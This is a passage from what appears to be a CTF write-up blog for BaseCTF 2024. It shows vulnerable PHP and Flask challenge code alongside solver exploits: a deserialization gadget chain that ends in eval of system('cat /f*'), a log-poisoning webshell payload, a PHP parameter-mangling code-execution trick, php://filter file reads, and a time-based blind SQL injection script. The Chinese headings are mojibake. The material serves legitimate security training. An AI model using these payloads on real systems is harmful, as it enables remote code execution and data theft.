class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&quot;hello world&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setWord</span>(<span class="hljs-params"><span class="hljs-variable">$word</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;word = <span class="hljs-variable">$word</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Nature#__destruct()==&gt;Sea#__get()==&gt;Shark#__invoke()==&gt;Sink#__toString()#eval()</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Nature</span>();<br><span class="hljs-variable">$a</span>-&gt;sea = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sea</span>();<br><span class="hljs-variable">$a</span>-&gt;sea-&gt;animal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shark</span>();<br><span class="hljs-variable">$a</span>-&gt;sea-&gt;animal-&gt;<span class="hljs-title function_ invoke__">setWord</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sink</span>());<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A18%3A%22system%28%27cat+%2Ff%2A%27%29%3B%22%3B%7D%7D%7D%7D</span><br></code></pre></td></tr></table></figure><h3 id="æ•°å­¦å¤§å¸ˆ"><a href="#æ•°å­¦å¤§å¸ˆ" class="headerlink" title="æ•°å­¦å¤§å¸ˆ"></a>æ•°å­¦å¤§å¸ˆ</h3><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>req = requests.session()<br>url = <span class="hljs-string">&quot;http://challenge.imxbt.cn:31901/&quot;</span><br>answer = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    response = req.post(url ,data = &#123;<span class="hljs-string">&#x27;answer&#x27;</span>: answer&#125;)<br>    <span class="hljs-built_in">print</span>(response.text)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(response.text)<br>        <span class="hljs-keyword">break</span><br><br>    regex = <span class="hljs-string">r&quot;(\d+)\s*([+\-Ã—Ã·*/])\s*(\d+)\?&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, response.text)<br><br>    a, op, b = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>    answer += <span class="hljs-number">1</span><br><br>    a, b = <span class="hljs-built_in">int</span>(a), <span class="hljs-built_in">int</span>(b)<br><br>    <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;+&#x27;</span>:<br>        answer = a + b<br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;-&#x27;</span>:<br>        answer = a - b<br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;Ã—&#x27;</span>:<br>        answer = a * b<br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;Ã·&#x27;</span>:<br>        answer = a // b<br></code></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="å¤è¯»æœº"><a href="#å¤è¯»æœº" class="headerlink" title="å¤è¯»æœº"></a>å¤è¯»æœº</h3><h3 id="æ»¤ä¸ªä¸åœ"><a href="#æ»¤ä¸ªä¸åœ" class="headerlink" title="æ»¤ä¸ªä¸åœ"></a>æ»¤ä¸ªä¸åœ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$incompetent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;incompetent&#x27;</span>];<br><span class="hljs-variable">$Datch</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Datch&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$incompetent</span> !== <span class="hljs-string">&#x27;HelloWorld&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="hljs-variable">$required_chars</span> = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>];<br><span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">true</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$required_chars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$char</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_valid</span>) &#123;<br><br>    <span class="hljs-variable">$invalid_patterns</span> = [<span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;http://&#x27;</span>, <span class="hljs-string">&#x27;https://&#x27;</span>, <span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;file://&#x27;</span> , <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;gopher://&#x27;</span>];<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$invalid_patterns</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pattern</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$pattern</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;</span>);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$Datch</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>nginxæ—¥å¿—åŒ…å«</p><p>payload</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//uaå¤´å†™ä¸€å¥è¯æœ¨é©¬</span><br>incompetent=HelloWorld&amp;Datch=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span>&amp;ly=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);phpinfo();<br></code></pre></td></tr></table></figure><h3 id="ç©å…ƒç¥ç©çš„"><a href="#ç©å…ƒç¥ç©çš„" class="headerlink" title="ç©å…ƒç¥ç©çš„"></a>ç©å…ƒç¥ç©çš„</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;len&#x27;</span>]) == <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>)) &#123;<br>  <span class="hljs-title function_ invoke__">ys_open</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tip&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ys_open</span>(<span class="hljs-params"><span class="hljs-variable">$tip</span></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$tip</span> != <span class="hljs-string">&quot;æˆ‘è¦ç©åŸç¥&quot;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­&quot;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">dumpFlag</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dumpFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) || <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">0</span>];<br>  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$a</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$b</span>) || <span class="hljs-variable">$a</span> != <span class="hljs-string">&quot;100%&quot;</span> || <span class="hljs-variable">$b</span> != <span class="hljs-string">&quot;love100%&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>  <span class="hljs-variable">$flag</span>[] = <span class="hljs-keyword">array</span>();<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$ii</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$ii</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>);<span class="hljs-variable">$ii</span>++) &#123;<br>    <span class="hljs-variable">$flag</span>[<span class="hljs-variable">$ii</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$array</span>[<span class="hljs-variable">$ii</span>]) ^ <span class="hljs-variable">$ii</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$flag</span>);<br>&#125; <br></code></pre></td></tr></table></figure><h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>å½“phpç‰ˆæœ¬å°äº8æ—¶ï¼Œgetè¯·æ±‚çš„å‚æ•°åå«æœ‰<code>.</code>ï¼Œä¼šè¢«è½¬ä¸º<code>_</code>ï¼Œä½†æ˜¯å¦‚æœå‚æ•°åä¸­å«æœ‰<code>[</code>ï¼Œ<code>[</code>è¿™ä¸ªå°†ç›´æ¥è¢«è½¬ä¸º<code>_</code>ä¸”åé¢çš„<code>.</code>å°†ä¸ä¼šè¢«è½¬ä¸º<code>_</code></p><p>payload</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">url/?Jail[<span class="hljs-keyword">by</span>.Happy=highlight_file(<span class="hljs-keyword">glob</span>(<span class="hljs-string">&quot;/f*&quot;</span>)[0]);<br></code></pre></td></tr></table></figure><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="åœ£é’¥ä¹‹æˆ˜1-0"><a href="#åœ£é’¥ä¹‹æˆ˜1-0" class="headerlink" title="åœ£é’¥ä¹‹æˆ˜1.0"></a>åœ£é’¥ä¹‹æˆ˜1.0</h3><h3 id="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"><a href="#flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ" class="headerlink" title="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"></a>flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>phpåŸç”Ÿç±»åˆ©ç”¨</p><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url<span class="hljs-regexp">/?K=DirectoryIterator&amp;W=/</span>secret/<br>postä¼ J=SplFileObject&amp;H=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/secret/</span>f11444g.php<br></code></pre></td></tr></table></figure><h3 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE&quot;</span>);<br>&#125;<br><span class="hljs-comment">//flag in ctf.flag</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½•&#x27;;&quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†selectå…³é”®å­—åŠä¸€äº›å­—ç¬¦</p><p>å…ˆ<code>show columns from ctf.flag</code></p><p><img src="/../images/BaseCTF2024/image-20251031154518017.png" alt="image-20251031154518017"></p><p>æœ‰ä¸¤ä¸ª å­—æ®µï¼ŒçŒœæµ‹flagåœ¨dataå­—æ®µ</p><p>æ— æ³•ç›´æ¥æŸ¥è¯¢ï¼Œåˆ©ç”¨deleteæ—¶é—´ç›²æ³¨ï¼Œexpå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>char_set = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;-_&#123;&#125;&quot;</span><br><br>url = <span class="hljs-string">&quot;http://challenge.imxbt.cn:31616/?sql=delete%20from%20ctf%2eflag%20where%20data%20like%20%27&quot;</span><br>flag = <span class="hljs-string">&quot;BaseCTF&#123;&quot;</span><br>end = <span class="hljs-string">&quot;%25%27%20and%20sleep(5)&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span>  char_set:<br>        <span class="hljs-keyword">try</span>:<br>            res = requests.get(url+flag+c+end, timeout=<span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(flag+c)<br>            flag += c<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="No-JWT"><a href="#No-JWT" class="headerlink" title="No JWT"></a>No JWT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br>app = Flask(__name__)<br><br><span class="hljs-comment"># éšæœºç”Ÿæˆ secret_key</span><br>app.secret_key = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">16</span>))<br><br><span class="hljs-comment"># ç™»å½•æ¥å£</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    data = request.json<br>    username = data.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = data.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br><br>    <span class="hljs-comment"># å…¶ä»–ç”¨æˆ·éƒ½ç»™äºˆ user æƒé™</span><br>    token = jwt.encode(&#123;<br>            <span class="hljs-string">&#x27;sub&#x27;</span>: username,<br>            <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>,  <span class="hljs-comment"># æ™®é€šç”¨æˆ·è§’è‰²</span><br>            <span class="hljs-string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="hljs-number">1</span>)<br>        &#125;, app.secret_key, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;), <span class="hljs-number">200</span><br><br><span class="hljs-comment"># flag æ¥å£</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    token = request.headers.get(<span class="hljs-string">&#x27;Authorization&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> token:<br>        <span class="hljs-keyword">try</span>:<br>            decoded = jwt.decode(token.split(<span class="hljs-string">&quot; &quot;</span>)[<span class="hljs-number">1</span>], options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;verify_exp&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>            <span class="hljs-comment"># æ£€æŸ¥ç”¨æˆ·è§’è‰²æ˜¯å¦ä¸º admin</span><br>            <span 